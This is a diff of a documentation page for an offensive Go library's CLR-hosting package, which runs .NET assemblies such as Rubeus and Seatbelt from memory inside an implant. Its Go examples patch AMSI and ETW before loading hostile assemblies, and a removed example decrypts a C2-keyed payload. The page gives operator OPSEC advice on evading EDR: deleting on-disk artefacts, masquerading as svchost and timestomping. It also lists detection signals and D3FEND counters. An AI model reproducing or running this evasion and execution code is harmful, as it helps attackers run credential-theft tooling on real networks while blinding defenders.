@@ -1,333 +1,208 @@
-# CLR Hosting — In-Process .NET Assembly Execution
-
-[<- Back to PE Operations](README.md)
-
-**MITRE ATT&CK:** [T1620 - Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)
-**Package:** `runtime/clr`
-**Platform:** Windows only
-**Detection:** Medium
-
 ---
+package: github.com/oioio-space/maldev/runtime/clr
+last_reviewed: 2026-04-27
+reflects_commit: 3797037
+---
+
+# CLR (.NET) in-process hosting
+
+[← runtime index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Host the .NET CLR in process via `ICLRMetaHost` /
+`ICorRuntimeHost` COM and execute .NET assemblies from memory —
+no `.exe` / `.dll` on disk. Equivalent to Cobalt Strike's
+`execute-assembly`. Pair with `evasion/amsi.PatchAll` upstream —
+AMSI v2 scans every assembly passed to `AppDomain.Load_3` and
+will block flagged bytes (SharpHound, Rubeus, Seatbelt).
 
 ## Primer
 
-Lots of offensive tooling ships as .NET (Rubeus, SharpHound, Seatbelt). `runtime/clr` loads the .NET runtime inside your Go process and executes that tooling from memory — no `powershell.exe`, no `InstallUtil.exe`, no child process for the defender to scope.
+The Common Language Runtime is the .NET execution engine. Any
+process can host the CLR by importing `mscoree.dll` and calling
+`CLRCreateInstance`. The hosting process gets a managed runtime
+inside its address space and can load + invoke .NET assemblies
+without spawning `dotnet.exe` / `powershell.exe`.
 
----
+Operationally:
 
-## What It Does
+- Run SharpHound / Rubeus / Seatbelt / GhostPack tooling
+  in-process from a Go implant — no separate `.exe` to drop, no
+  process-tree anomaly.
+- Side-step `dotnet.exe` / `powershell.exe` lineage rules.
+- Bridge to the entire .NET ecosystem for credential dumping,
+  token theft, AD enumeration.
 
-Loads the .NET Common Language Runtime in the current process and executes
-.NET EXE/DLL assemblies **from memory** — no disk writes of the payload,
-no child process.
+The trade-offs are loud:
+
+- Loading `clr.dll` + `mscoreei.dll` in a non-.NET process is
+  itself a high-fidelity heuristic.
+- AMSI v2 scans every `Load_3` call; without an AMSI patch most
+  published tooling is blocked.
+- ETW Microsoft-Windows-DotNETRuntime emits assembly-load events.
 
 ## How It Works
 
-Two activation paths are tried in order:
-
-1. **`mscoree!CorBindToRuntimeEx`** (legacy pre-.NET-4 hosting API).
-   Deprecated but still exported — bypasses the metahost shim policy on
-   correctly configured hosts.
-2. **`CLRCreateInstance` → `ICLRMetaHost` → `GetRuntime` →
-   `BindAsLegacyV2Runtime` → `GetInterface(ICorRuntimeHost)`**. The modern
-   documented path; succeeds when legacy v2 activation policy is already
-   bound at process start.
-
-Once an `ICorRuntimeHost` is obtained, `Start()` brings the runtime up.
-The default `AppDomain` is queried for `IDispatch`; a
-`SAFEARRAY[byte]` carrying the assembly bytes is passed to
-`AppDomain.Load_3`; `EntryPoint.Invoke` (EXE) or
-`MethodInfo.Invoke` (DLL) executes the managed code.
-
 ```mermaid
-flowchart LR
-    subgraph Path1 [Path 1]
-        A1["CorBindToRuntimeEx"] --> H1["ICorRuntimeHost"]
-    end
-    subgraph Path2 [Path 2 fallback]
-        A2["CLRCreateInstance"] --> B2["ICLRMetaHost"]
-        B2 --> C2["GetRuntime"]
-        C2 --> D2["BindAsLegacyV2Runtime"]
-        D2 --> E2["GetInterface"]
-        E2 --> H2["ICorRuntimeHost"]
-    end
-    H1 --> S["Start"]
-    H2 --> S
-    S --> G["GetDefaultDomain"]
-    G --> L["IDispatch Load_3"]
-    L --> I["EntryPoint.Invoke"]
+sequenceDiagram
+    participant Imp as Implant
+    participant MH as ICLRMetaHost
+    participant RT as ICLRRuntimeInfo
+    participant Host as ICorRuntimeHost
+    participant AD as AppDomain (default)
+    participant Asm as managed assembly
+
+    Imp->>Imp: mscoree.CLRCreateInstance
+    Imp->>MH: GetRuntime("v4.0.30319")
+    MH-->>RT: ICLRRuntimeInfo
+    Imp->>RT: GetInterface(CLSID_CLRRuntimeHost, IID_ICorRuntimeHost)
+    RT-->>Host: ICorRuntimeHost
+    Imp->>Host: Start
+    Imp->>Host: GetDefaultDomain
+    Host-->>AD: IUnknown → IDispatch
+    Imp->>AD: Load_3(SAFEARRAY[byte])
+    AD-->>Asm: loaded assembly
+    Imp->>Asm: EntryPoint.Invoke(args)
+    Asm-->>Imp: managed code runs in-proc
 ```
 
-## API
-
-```go
-func Load(caller *wsyscall.Caller) (*Runtime, error)
-func InstalledRuntimes() ([]string, error)
-func (r *Runtime) ExecuteAssembly(assembly []byte, args []string) error
-func (r *Runtime) ExecuteDLL(dll []byte, typeName, methodName, arg string) error
-func (r *Runtime) Close()
-
-// Policy helpers — see "Environmental Requirement" below.
-func InstallRuntimeActivationPolicy() error
-func RemoveRuntimeActivationPolicy()  error
-
-// Sentinel returned when ICorRuntimeHost cannot be obtained.
-var ErrLegacyRuntimeUnavailable error
-```
-
-## Compared to `pe/srdi`
-
-|            | `runtime/clr`                            | `pe/srdi`                  |
-|------------|-------------------------------------|----------------------------|
-| Target     | Current process                     | Any remote process         |
-| .NET       | Native (IL execution)               | Donut-wrapped stub         |
-| Disk I/O   | `<exe>.config` (see below)          | None                       |
-| AMSI       | `AppDomain.Load_3` scanned          | Donut loader scanned       |
-| OPSEC      | Medium (CLR DLLs loaded, .config)   | High (shellcode-only)      |
-
-## Environmental Requirement
-
-On Windows 10+, `ICorRuntimeHost` is not directly instantiable from a
-pure-native host (any Go binary without a .NET manifest). You need **both**:
-
-1. A v2-capable CLR — i.e. **.NET Framework 3.5 installed** (Windows
-   optional feature `NetFx3`). On a domain image, `DISM /Online
-   /Enable-Feature /FeatureName:NetFx3 /All` or `Add-WindowsCapability`.
-2. An `<exe>.config` file next to the running binary containing:
-   ```xml
-   <?xml version="1.0" encoding="utf-8"?>
-   <configuration>
-     <startup useLegacyV2RuntimeActivationPolicy="true">
-       <supportedRuntime version="v4.0.30319"/>
-       <supportedRuntime version="v2.0.50727"/>
-     </startup>
-   </configuration>
-   ```
-
-**Why not embed it via the PE manifest?**
-`useLegacyV2RuntimeActivationPolicy` is read from an external
-`<exe>.config` by `mscoree.dll`, not from `RT_MANIFEST`. There is no
-equivalent `<trustInfo>`/`<compatibility>` block in the PE manifest schema
-that carries this directive. The `pe/masquerade` package can masquerade the
-binary's VERSIONINFO + icon + UAC level, but it cannot activate legacy
-CLR policy.
-
-If either requirement is missing, `Load` returns
-`ErrLegacyRuntimeUnavailable`. `InstalledRuntimes()` always works and is
-useful for target profiling.
-
-## Usage
-
-```go
-import "github.com/oioio-space/maldev/runtime/clr"
-
-// One-time: write <exe>.config so legacy v2 activation policy is honoured.
-_ = clr.InstallRuntimeActivationPolicy()
-
-rt, err := clr.Load(nil) // nil caller = WinAPI
-if err != nil {
-    // errors.Is(err, clr.ErrLegacyRuntimeUnavailable) if v2 CLR missing
-    panic(err)
-}
-defer rt.Close()
-
-// Execute a .NET EXE from memory.
-assembly, _ := os.ReadFile("Rubeus.exe")
-_ = rt.ExecuteAssembly(assembly, []string{"triage"})
-
-// Or a DLL:
-// rt.ExecuteDLL(dllBytes, "Namespace.TypeName", "MethodName", "arg")
-
-// Remove the config artefact — runtime keeps working, disk evidence gone.
-_ = clr.RemoveRuntimeActivationPolicy()
-```
-
----
-
-## Recommended Usage — with OPSEC cleanup
-
-```go
-package main
-
-import (
-	"log"
-	"os"
-
-	"github.com/oioio-space/maldev/evasion/amsi"
-	"github.com/oioio-space/maldev/runtime/clr"
-)
-
-func main() {
-	// Blind AMSI BEFORE loading hostile assemblies.
-	_ = amsi.PatchAll(nil)
-
-	// Write <self>.config so mscoree honours legacy v2 activation policy.
-	if err := clr.InstallRuntimeActivationPolicy(); err != nil {
-		log.Fatal(err)
-	}
-
-	rt, err := clr.Load(nil)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer rt.Close()
-
-	// OPSEC: the config is only read once (at first mscoree call). After
-	// Load() succeeds we can delete the on-disk artefact — the loaded
-	// runtime remains fully functional for the lifetime of the process.
-	_ = clr.RemoveRuntimeActivationPolicy()
-
-	assembly, _ := os.ReadFile("Rubeus.exe")
-	_ = rt.ExecuteAssembly(assembly, []string{"asktgt", "/user:admin"})
-}
-```
-
----
-
-## Combined Example
-
-Ship the .NET assembly to the target AES-GCM-encrypted, decrypt it in
-memory, and hand the plaintext directly to `rt.ExecuteAssembly` — the
-payload never exists unencrypted on disk and `AppDomain.Load_3` sees
-it only after AMSI has been blinded.
-
-```go
-package main
-
-import (
-    "log"
-    "os"
-
-    "github.com/oioio-space/maldev/crypto"
-    "github.com/oioio-space/maldev/evasion/amsi"
-    "github.com/oioio-space/maldev/runtime/clr"
-)
-
-func main() {
-    // 1. Blind AMSI before any managed code touches AmsiScanBuffer.
-    _ = amsi.PatchAll(nil)
-
-    // 2. Ensure the legacy v2 activation policy is in place.
-    if err := clr.InstallRuntimeActivationPolicy(); err != nil {
-        log.Fatal(err)
-    }
-
-    // 3. Read the AES-GCM blob (embedded via //go:embed or dropped
-    //    by a stager). The key is a build-time constant or derived
-    //    from a C2 handshake — never stored alongside the blob.
-    key := mustLoadKey()
-    blob, err := os.ReadFile("payload.bin") // AES-GCM ciphertext
-    if err != nil {
-        log.Fatal(err)
-    }
-    assembly, err := crypto.DecryptAESGCM(key, blob)
-    if err != nil {
-        log.Fatal(err) // integrity failure aborts cleanly
-    }
-
-    // 4. Load CLR and execute the decrypted assembly.
-    rt, err := clr.Load(nil)
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer rt.Close()
-    _ = clr.RemoveRuntimeActivationPolicy() // delete config artefact
-
-    _ = rt.ExecuteAssembly(assembly, []string{"triage", "/quiet"})
-}
-
-func mustLoadKey() []byte { /* ... */ return nil }
-```
-
-Layered benefit: the on-disk artefact is ciphertext (static YARA/AV
-gets nothing), AMSI is silenced before any managed buffer hits
-`AmsiScanBuffer` (defender's in-memory scan blinded), and the `.config`
-file is removed between `Load()` and payload execution (EDR minifilter
-sees the file appear and disappear in the same second, with no managed
-code to connect it to).
-
----
-
-## OPSEC Notes
-
-### The `<exe>.config` artefact
-
-**What is written.** `InstallRuntimeActivationPolicy()` creates
-`<os.Executable()>.config` next to the running binary. This is the only
-mandatory on-disk writeback for `runtime/clr`.
-
-**Forensic visibility.**
-- EDR minifilter / sysmon EID 11 (file creation).
-- Any subsequent on-disk scan (scheduled AV, triage tooling) will see the
-  file.
-- A `.config` next to a non-.NET binary is a strong analyst heuristic,
-  especially one that explicitly enables `useLegacyV2RuntimeActivationPolicy`.
-
-**Mitigations provided by this package.**
-- `RemoveRuntimeActivationPolicy()` — delete the file **after** `Load()`
-  returns. The CLR caches policy in-process on first resolution; the file
-  is no longer consulted afterwards. The runtime keeps working, but the
-  disk artefact is gone.
-- `InstallRuntimeActivationPolicy` returns silently if the file already
-  exists — this lets you target a host that legitimately ships a managed
-  `<exe>.config` (Microsoft product directories, MS Office installation
-  paths) and avoid writing anything at all.
-
-**Mitigations NOT provided (caller's responsibility).**
-- No ADS stashing of the config. `runtime/clr` writes a visible file.
-- No timestomp — pair with `cleanup/timestomp` if you want the config
-  modification time to blend in.
-- If the process crashes between Install and Remove, the file stays.
-
-### Other detection signals
-
-- **Module load** — `clr.dll`, `mscoreei.dll`, `mscorwks.dll` (CLR2) load
-  into the process. Sysmon EID 7 / EDR `LdrLoadDll` hooks will see these.
-- **AMSI v2** — every byte slice passed to `AppDomain.Load_3` is scanned
-  by `AmsiScanBuffer`. Call `evasion/amsi.PatchAll()` first.
-- **ETW** — CLR emits a rich stream of events
-  (`Microsoft-Windows-DotNETRuntime`). Disable via `evasion/etw.All()` if
-  needed.
-- **VERSIONINFO mismatch** — a Go binary claiming to be a .NET host is
-  unusual. Pair with `pe/masquerade/preset/<identity>` for a
-  legitimate-looking host (e.g. `masquerade/svchost` — svchost.exe is a
-  common legitimate CLR host).
-
-### When `pe/srdi` is the better choice
-
-If your OPSEC constraints preclude writing a `.config` at all, or you
-need to target a remote process (already-running managed app) rather
-than the current one, prefer `pe/srdi`:
-
-- Converts your `.NET EXE/DLL` to shellcode via Donut.
-- Inject the shellcode into any process using `inject/`. `pe/srdi`
-  wraps the CLR inside the injected stub — no `<exe>.config` needed, no
-  visible disk writes.
-
-## MITRE ATT&CK
-
-| Technique | ID |
-|-----------|-----|
-| Reflective Code Loading | [T1620](https://attack.mitre.org/techniques/T1620/) |
-
-## Detection Level
-
-**Medium** — ICorRuntimeHost use is detectable at multiple layers (module
-load, ETW, filesystem), but each layer can be addressed: AMSI patched,
-ETW disabled, `.config` removed post-init, host masqueraded via
-`pe/masquerade`. A determined SOC with behavioural telemetry will still
-spot it; a signature-only stack typically won't.
-
-## Credits
-
-- [ropnop/go-clr](https://github.com/ropnop/go-clr) — vtable layouts and
-  flow reference.
-
----
+`Load(nil)` picks the preferred installed runtime
+(v4 > legacy). For .NET 3.5 (legacy) targets call
+[InstallRuntimeActivationPolicy] first to register the required
+CLSID — disabled by default on modern Windows. The package
+returns [ErrLegacyRuntimeUnavailable] when the legacy runtime
+can't be activated.
 
 ## API Reference
 
-The full inline signature block lives in the [API](#api) section above.
-The area-doc walkthrough (longer narrative on AppDomain lifecycle, AMSI
-interaction, the `<exe>.config` activation chain) lives in
-[`docs/runtime.md`](../../runtime.md).
+| Symbol | Description |
+|---|---|
+| [`type Runtime`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#Runtime) | Active CLR host instance |
+| [`Load(caller *wsyscall.Caller) (*Runtime, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#Load) | Bring up the CLR; pick preferred runtime |
+| `(*Runtime).ExecuteAssembly(asm []byte, args []string) error` | Load + invoke entry point |
+| `(*Runtime).Close() error` | Tear down the AppDomain + release COM |
+| [`InstalledRuntimes() ([]string, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#InstalledRuntimes) | Enumerate installed .NET versions |
+| [`InstallRuntimeActivationPolicy() error`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#InstallRuntimeActivationPolicy) | Register .NET 3.5 CLSID for legacy hosting |
+| [`RemoveRuntimeActivationPolicy() error`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#RemoveRuntimeActivationPolicy) | Reverse the install |
+| [`var ErrLegacyRuntimeUnavailable`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#ErrLegacyRuntimeUnavailable) | .NET 3.5 hosting unavailable |
+| [`type Args`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#Args) / [`NewArgs()`](https://pkg.go.dev/github.com/oioio-space/maldev/runtime/clr#NewArgs) | Typed argv builder |
+
+## Examples
+
+### Simple — load + execute
+
+```go
+import (
+    "os"
+
+    "github.com/oioio-space/maldev/runtime/clr"
+)
+
+rt, err := clr.Load(nil)
+if err != nil {
+    return
+}
+defer rt.Close()
+
+asm, _ := os.ReadFile("Seatbelt.exe")
+_ = rt.ExecuteAssembly(asm, []string{"-group=system"})
+```
+
+### Composed — AMSI patch + ETW patch + execute
+
+```go
+import (
+    "os"
+
+    "github.com/oioio-space/maldev/evasion/amsi"
+    "github.com/oioio-space/maldev/evasion/etw"
+    "github.com/oioio-space/maldev/runtime/clr"
+)
+
+if err := amsi.PatchAll(); err != nil {
+    return
+}
+_ = etw.PatchAll()
+
+rt, _ := clr.Load(nil)
+defer rt.Close()
+
+asm, _ := os.ReadFile("Rubeus.exe")
+_ = rt.ExecuteAssembly(asm, []string{"triage"})
+```
+
+### Advanced — list + pick runtime
+
+```go
+versions, _ := clr.InstalledRuntimes()
+for _, v := range versions {
+    fmt.Println("installed:", v)
+}
+```
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| `clr.dll` + `mscoreei.dll` module load in non-.NET host | High-fidelity heuristic — Defender for Endpoint, Elastic, S1 |
+| `AmsiScanBuffer` flagging the assembly | AMSI v2 scans every `Load_3` — published tooling caught universally |
+| Microsoft-Windows-DotNETRuntime ETW provider | Assembly-load events; without ETW patch every load is logged |
+| `ICorRuntimeHost` COM activation from non-Microsoft process | EDR COM-activation telemetry |
+| Process Hollowing-like behaviour: process metadata says non-.NET, runtime hosts CLR | Behavioural EDR rule |
+
+**D3FEND counters:**
+
+- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/) — module-load lineage.
+- [D3-FCA](https://d3fend.mitre.org/technique/d3f:FileContentAnalysis/) — AMSI on assembly bytes.
+
+**Hardening for the operator:**
+
+- Always patch AMSI ([`evasion/amsi.PatchAll`](../evasion/amsi-bypass.md))
+  before `ExecuteAssembly`.
+- Pair with [`evasion/etw`](../evasion/etw-patching.md) for the
+  .NET runtime ETW silencing.
+- Run inside a process where `clr.dll` load is plausible
+  (Office, browsers, managed-service hosts).
+- Pair with [`pe/masquerade/preset/svchost`](../pe/masquerade.md)
+  if running from a fresh process.
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1620](https://attack.mitre.org/techniques/T1620/) | Reflective Code Loading | full — CLR-hosted in-memory .NET | D3-FCA, D3-PSA |
+| [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter | partial — in-process .NET execution without dotnet.exe | D3-PSA |
+
+## Limitations
+
+- **AMSI / ETW upstream patches required for hostile assemblies.**
+- **CLR lifecycle is global per-process.** Once started, a CLR
+  cannot be cleanly unloaded; subsequent `Load` calls re-use
+  the same instance.
+- **Output capture.** Stdout / stderr from the assembly require
+  redirection setup before `ExecuteAssembly`.
+- **AppDomain isolation absent.** All assemblies share the
+  default AppDomain; one exception can take down the runtime.
+- **.NET 3.5 disabled-by-default on modern Windows.** Legacy
+  runtime hosting needs the policy install.
+- **`[STAThread]` requirement.** Some assemblies require an
+  STA apartment; running without re-creating that apartment
+  may fail for COM-heavy tooling.
+
+## Credit
+
+- ropnop/go-clr — canonical Go port; vendored upstream.
+
+## See also
+
+- [`runtime/bof`](bof-loader.md) — sibling reflective runtime
+  (COFF / native code).
+- [`evasion/amsi`](../evasion/amsi-bypass.md) — REQUIRED for
+  hostile assemblies.
+- [`evasion/etw`](../evasion/etw-patching.md) — silence .NET
+  runtime ETW.
+- [`pe/srdi`](../pe/pe-to-shellcode.md) — alternative path for
+  .NET → shellcode via Donut.
+- [Operator path](../../by-role/operator.md).
+- [Detection eng path](../../by-role/detection-eng.md).
